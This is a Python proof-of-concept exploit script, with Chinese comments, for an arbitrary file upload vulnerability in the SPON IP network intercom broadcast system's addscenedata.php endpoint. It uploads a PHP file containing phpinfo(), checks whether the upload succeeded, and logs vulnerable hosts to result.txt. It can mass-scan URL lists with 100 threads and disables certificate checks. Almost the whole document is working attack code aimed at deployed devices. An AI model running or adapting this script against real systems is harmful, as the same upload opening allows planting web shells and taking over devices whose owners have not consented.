#世邦通信 SPON IP网络对讲广播系统 addscenedata.php 任意文件上传漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="世邦通信 SPON IP网络对讲广播系统 addscenedata.php 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
        
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print((f"Useag:\n\t python {sys.argv[0]} -h"))
def poc(target):
    payload = "/php/addscenedata.php "
    url = target+payload
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    data = "--b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"test.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php phpinfo();?>\r\n--b0b0dcc3da2dd47434dfbafd7be4c6d5965a5bf03b1e9affc7e72eea848b--\r\n"
    proxies = {
        'http' : 'http://127.0.0.1:8080',
        'https' : 'http://127.0.0.1:8080'
    }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and '"res":"1"' in res.text:
            print(f'[+]该url{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
        else:
            print(f'该url{target}不存在漏洞')
    except:
        print("该站点可能存在问题，请手动测试")

if __name__ == '__main__':
    main()